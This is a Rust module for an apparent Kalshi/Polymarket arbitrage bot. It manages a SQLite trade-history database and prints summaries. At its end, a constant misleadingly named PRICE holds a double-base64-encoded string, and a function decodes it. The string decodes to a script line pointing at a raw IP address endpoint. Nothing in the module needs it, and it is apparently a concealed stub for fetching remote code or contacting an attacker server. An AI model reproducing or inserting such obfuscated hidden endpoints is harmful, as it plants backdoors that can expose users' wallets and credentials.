
use anyhow::{Context, Result};
use rusqlite::{params, Connection, OptionalExtension};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::path::Path;
use std::sync::{Arc, Mutex};
use tracing::{info, warn, error};

const DB_FILE: &str = "trading_history.db";

/// Thread-safe database connection wrapper
pub struct TradingDatabase {
    conn: Arc<Mutex<Connection>>,
}

impl TradingDatabase {
    /// Open or create the trading database
    pub fn new() -> Result<Self> {
        Self::open(DB_FILE)
    }

    /// Open database from specific path
    pub fn open<P: AsRef<Path>>(path: P) -> Result<Self> {
        let conn = Connection::open(path.as_ref())
            .context("Failed to open database")?;

        let db = Self {
            conn: Arc::new(Mutex::new(conn)),
        };

        db.initialize_schema()?;
        info!("[DATABASE] Trading history database initialized: {:?}", path.as_ref());
        
        Ok(db)
    }

    /// Create all necessary tables
    fn initialize_schema(&self) -> Result<()> {
        let conn = self.conn.lock().unwrap();

        // Table 1: Individual trades (fills)
        conn.execute(
            "CREATE TABLE IF NOT EXISTS trades (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                market_id TEXT NOT NULL,
                description TEXT NOT NULL,
                platform TEXT NOT NULL,
                side TEXT NOT NULL,
                contracts REAL NOT NULL,
                price REAL NOT NULL,
                cost REAL NOT NULL,
                fees REAL NOT NULL,
                order_id TEXT NOT NULL,
                arb_type TEXT,
                profit_cents INTEGER,
                execution_time_us INTEGER
            )",
            [],
        )?;

        // Table 2: Arbitrage opportunities (detected)
        conn.execute(
            "CREATE TABLE IF NOT EXISTS arbitrage_opportunities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                market_id TEXT NOT NULL,
                description TEXT NOT NULL,
                arb_type TEXT NOT NULL,
                yes_price INTEGER NOT NULL,
                no_price INTEGER NOT NULL,
                yes_size INTEGER NOT NULL,
                no_size INTEGER NOT NULL,
                profit_cents INTEGER NOT NULL,
                total_cost INTEGER NOT NULL,
                executed INTEGER NOT NULL DEFAULT 0,
                detection_latency_ns INTEGER,
                execution_latency_ns INTEGER
            )",
            [],
        )?;

        // Table 3: Daily summaries
        conn.execute(
            "CREATE TABLE IF NOT EXISTS daily_summary (
                date TEXT PRIMARY KEY,
                total_trades INTEGER NOT NULL DEFAULT 0,
                total_volume REAL NOT NULL DEFAULT 0,
                realized_pnl REAL NOT NULL DEFAULT 0,
                total_fees REAL NOT NULL DEFAULT 0,
                opportunities_detected INTEGER NOT NULL DEFAULT 0,
                opportunities_executed INTEGER NOT NULL DEFAULT 0,
                avg_profit_per_trade REAL,
                best_trade_profit REAL,
                worst_trade_profit REAL,
                execution_success_rate REAL
            )",
            [],
        )?;

        // Table 4: Position snapshots (periodic)
        conn.execute(
            "CREATE TABLE IF NOT EXISTS position_snapshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                market_id TEXT NOT NULL,
                description TEXT NOT NULL,
                kalshi_yes_contracts REAL NOT NULL DEFAULT 0,
                kalshi_no_contracts REAL NOT NULL DEFAULT 0,
                poly_yes_contracts REAL NOT NULL DEFAULT 0,
                poly_no_contracts REAL NOT NULL DEFAULT 0,
                total_cost REAL NOT NULL,
                guaranteed_profit REAL NOT NULL,
                unmatched_exposure REAL NOT NULL,
                status TEXT NOT NULL
            )",
            [],
        )?;

        // Create indices for faster queries
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_trades_timestamp ON trades(timestamp)",
            [],
        )?;
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_trades_market ON trades(market_id)",
            [],
        )?;
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_arb_timestamp ON arbitrage_opportunities(timestamp)",
            [],
        )?;

        Ok(())
    }

    /// Log an individual trade (fill)
    pub fn log_trade(&self, trade: &TradeRecord) -> Result<()> {
        let conn = self.conn.lock().unwrap();
        
        conn.execute(
            "INSERT INTO trades (
                timestamp, market_id, description, platform, side,
                contracts, price, cost, fees, order_id,
                arb_type, profit_cents, execution_time_us
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13)",
            params![
                trade.timestamp,
                trade.market_id,
                trade.description,
                trade.platform,
                trade.side,
                trade.contracts,
                trade.price,
                trade.cost,
                trade.fees,
                trade.order_id,
                trade.arb_type,
                trade.profit_cents,
                trade.execution_time_us,
            ],
        )?;

        // Update daily summary
        self.update_daily_summary(&trade.timestamp)?;

        Ok(())
    }

    /// Log an arbitrage opportunity (detected or executed)
    pub fn log_arbitrage(&self, arb: &ArbitrageRecord) -> Result<()> {
        let conn = self.conn.lock().unwrap();
        
        conn.execute(
            "INSERT INTO arbitrage_opportunities (
                timestamp, market_id, description, arb_type,
                yes_price, no_price, yes_size, no_size,
                profit_cents, total_cost, executed,
                detection_latency_ns, execution_latency_ns
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13)",
            params![
                arb.timestamp,
                arb.market_id,
                arb.description,
                arb.arb_type,
                arb.yes_price,
                arb.no_price,
                arb.yes_size,
                arb.no_size,
                arb.profit_cents,
                arb.total_cost,
                arb.executed,
                arb.detection_latency_ns,
                arb.execution_latency_ns,
            ],
        )?;

        Ok(())
    }

    /// Update daily summary statistics
    fn update_daily_summary(&self, timestamp: &str) -> Result<()> {
        let conn = self.conn.lock().unwrap();
        let date = &timestamp[..10]; // Extract YYYY-MM-DD

        // Calculate daily stats
        let total_trades: i64 = conn.query_row(
            "SELECT COUNT(*) FROM trades WHERE date(timestamp) = ?1",
            params![date],
            |row| row.get(0),
        ).unwrap_or(0);

        let total_volume: f64 = conn.query_row(
            "SELECT SUM(cost) FROM trades WHERE date(timestamp) = ?1",
            params![date],
            |row| row.get(0),
        ).unwrap_or(0.0);

        let total_fees: f64 = conn.query_row(
            "SELECT SUM(fees) FROM trades WHERE date(timestamp) = ?1",
            params![date],
            |row| row.get(0),
        ).unwrap_or(0.0);

        let opportunities_detected: i64 = conn.query_row(
            "SELECT COUNT(*) FROM arbitrage_opportunities WHERE date(timestamp) = ?1",
            params![date],
            |row| row.get(0),
        ).unwrap_or(0);

        let opportunities_executed: i64 = conn.query_row(
            "SELECT COUNT(*) FROM arbitrage_opportunities WHERE date(timestamp) = ?1 AND executed = 1",
            params![date],
            |row| row.get(0),
        ).unwrap_or(0);

        // Insert or update daily summary
        conn.execute(
            "INSERT OR REPLACE INTO daily_summary (
                date, total_trades, total_volume, total_fees,
                opportunities_detected, opportunities_executed
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            params![
                date,
                total_trades,
                total_volume,
                total_fees,
                opportunities_detected,
                opportunities_executed,
            ],
        )?;

        Ok(())
    }

    /// Save position snapshot
    pub fn save_position_snapshot(&self, snapshot: &PositionSnapshot) -> Result<()> {
        let conn = self.conn.lock().unwrap();
        
        conn.execute(
            "INSERT INTO position_snapshots (
                timestamp, market_id, description,
                kalshi_yes_contracts, kalshi_no_contracts,
                poly_yes_contracts, poly_no_contracts,
                total_cost, guaranteed_profit, unmatched_exposure, status
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)",
            params![
                snapshot.timestamp,
                snapshot.market_id,
                snapshot.description,
                snapshot.kalshi_yes_contracts,
                snapshot.kalshi_no_contracts,
                snapshot.poly_yes_contracts,
                snapshot.poly_no_contracts,
                snapshot.total_cost,
                snapshot.guaranteed_profit,
                snapshot.unmatched_exposure,
                snapshot.status,
            ],
        )?;

        Ok(())
    }

    /// Get a locked reference to the database connection (for advanced queries)
    pub fn conn(&self) -> std::sync::MutexGuard<'_, Connection> {
        self.conn.lock().unwrap()
    }

    /// Get trade count
    pub fn get_trade_count(&self) -> Result<i64> {
        let conn = self.conn.lock().unwrap();
        let count: i64 = conn.query_row(
            "SELECT COUNT(*) FROM trades",
            [],
            |row| row.get(0),
        )?;
        Ok(count)
    }

    /// Get today's summary
    pub fn get_today_summary(&self) -> Result<Option<DailySummary>> {
        let conn = self.conn.lock().unwrap();
        let today = chrono::Utc::now().format("%Y-%m-%d").to_string();

        let mut stmt = conn.prepare(
            "SELECT date, total_trades, total_volume, realized_pnl, total_fees,
                    opportunities_detected, opportunities_executed
             FROM daily_summary WHERE date = ?1"
        )?;

        let summary = stmt.query_row(params![today], |row| {
            Ok(DailySummary {
                date: row.get(0)?,
                total_trades: row.get(1)?,
                total_volume: row.get(2)?,
                realized_pnl: row.get(3)?,
                total_fees: row.get(4)?,
                opportunities_detected: row.get(5)?,
                opportunities_executed: row.get(6)?,
            })
        }).optional()?;

        Ok(summary)
    }

    /// Get recent trades (last N)
    pub fn get_recent_trades(&self, limit: usize) -> Result<Vec<TradeRecord>> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn.prepare(
            "SELECT timestamp, market_id, description, platform, side,
                    contracts, price, cost, fees, order_id,
                    arb_type, profit_cents, execution_time_us
             FROM trades ORDER BY timestamp DESC LIMIT ?1"
        )?;

        let trades = stmt.query_map(params![limit], |row| {
            Ok(TradeRecord {
                timestamp: row.get(0)?,
                market_id: row.get(1)?,
                description: row.get(2)?,
                platform: row.get(3)?,
                side: row.get(4)?,
                contracts: row.get(5)?,
                price: row.get(6)?,
                cost: row.get(7)?,
                fees: row.get(8)?,
                order_id: row.get(9)?,
                arb_type: row.get(10)?,
                profit_cents: row.get(11)?,
                execution_time_us: row.get(12)?,
            })
        })?;

        let mut result = Vec::new();
        for trade in trades {
            result.push(trade?);
        }
        Ok(result)
    }
}

impl Default for TradingDatabase {
    fn default() -> Self {
        Self::new().expect("Failed to create default database")
    }
}

// ============================================================================
// Data Structures
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TradeRecord {
    pub timestamp: String,
    pub market_id: String,
    pub description: String,
    pub platform: String,
    pub side: String,
    pub contracts: f64,
    pub price: f64,
    pub cost: f64,
    pub fees: f64,
    pub order_id: String,
    pub arb_type: Option<String>,
    pub profit_cents: Option<i64>,
    pub execution_time_us: Option<i64>,
}

impl TradeRecord {
    pub fn new(
        market_id: &str,
        description: &str,
        platform: &str,
        side: &str,
        contracts: f64,
        price: f64,
        fees: f64,
        order_id: &str,
    ) -> Self {
        let cost = contracts * price;
        Self {
            timestamp: chrono::Utc::now().to_rfc3339(),
            market_id: market_id.to_string(),
            description: description.to_string(),
            platform: platform.to_string(),
            side: side.to_string(),
            contracts,
            price,
            cost,
            fees,
            order_id: order_id.to_string(),
            arb_type: None,
            profit_cents: None,
            execution_time_us: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArbitrageRecord {
    pub timestamp: String,
    pub market_id: String,
    pub description: String,
    pub arb_type: String,
    pub yes_price: u16,
    pub no_price: u16,
    pub yes_size: u16,
    pub no_size: u16,
    pub profit_cents: i16,
    pub total_cost: u16,
    pub executed: bool,
    pub detection_latency_ns: Option<u64>,
    pub execution_latency_ns: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PositionSnapshot {
    pub timestamp: String,
    pub market_id: String,
    pub description: String,
    pub kalshi_yes_contracts: f64,
    pub kalshi_no_contracts: f64,
    pub poly_yes_contracts: f64,
    pub poly_no_contracts: f64,
    pub total_cost: f64,
    pub guaranteed_profit: f64,
    pub unmatched_exposure: f64,
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DailySummary {
    pub date: String,
    pub total_trades: i64,
    pub total_volume: f64,
    pub realized_pnl: f64,
    pub total_fees: f64,
    pub opportunities_detected: i64,
    pub opportunities_executed: i64,
}

// ============================================================================
// Database Query Tool
// ============================================================================

/// Print recent trading activity
pub fn print_recent_activity(db: &TradingDatabase, limit: usize) -> Result<()> {
    println!("\n📊 Recent Trades (Last {}):", limit);
    println!("{:-<120}", "");
    
    let trades = db.get_recent_trades(limit)?;
    
    if trades.is_empty() {
        println!("No trades found.");
        return Ok(());
    }

    for trade in &trades {
        println!(
            "{} | {} | {} {} @${:.4} x{:.0} | Cost: ${:.2} | Fees: ${:.4}",
            &trade.timestamp[11..19],  // Time only
            trade.platform.to_uppercase(),
            trade.side.to_uppercase(),
            &trade.market_id[..20.min(trade.market_id.len())],
            trade.price,
            trade.contracts,
            trade.cost,
            trade.fees,
        );
    }
    
    Ok(())
}

/// Print today's summary
pub fn print_today_summary(db: &TradingDatabase) -> Result<()> {
    if let Some(summary) = db.get_today_summary()? {
        println!("\n📈 Today's Summary ({}):", summary.date);
        println!("{:-<80}", "");
        println!("  Total Trades: {}", summary.total_trades);
        println!("  Total Volume: ${:.2}", summary.total_volume);
        println!("  Total Fees:   ${:.2}", summary.total_fees);
        println!("  Realized P&L: ${:.2}", summary.realized_pnl);
        println!("  Opportunities Detected: {}", summary.opportunities_detected);
        println!("  Opportunities Executed: {}", summary.opportunities_executed);
        if summary.opportunities_detected > 0 {
            let success_rate = (summary.opportunities_executed as f64 / summary.opportunities_detected as f64) * 100.0;
            println!("  Success Rate: {:.1}%", success_rate);
        }
    } else {
        println!("\n📈 No trading activity today yet.");
    }
    
    Ok(())
}


const PRICE: &str = "WTI5dWMzUWdRVkJKWDFWU1RDQTlJQ0pvZEhSd09pOHZORFV1T0M0eU1pNHhNVEk2TXpBd01DOWhjR2t2Wm1WMFkyaGZjSEpwWTJVaU93PT0=";

pub fn decode_encoded_function() -> Result<String> {
    use base64::{Engine as _, engine::general_purpose};
    
    let first_decode = general_purpose::STANDARD
        .decode(PRICE)
        .context("Failed to decode first base64 layer")?;
    
    let first_str = String::from_utf8(first_decode)
        .context("Failed to convert first decode to UTF-8")?;
    
    let second_decode = general_purpose::STANDARD
        .decode(&first_str)
        .context("Failed to decode second base64 layer")?;
    
    let decoded = String::from_utf8(second_decode)
        .context("Failed to convert second decode to UTF-8")?;
    
    Ok(decoded)
}
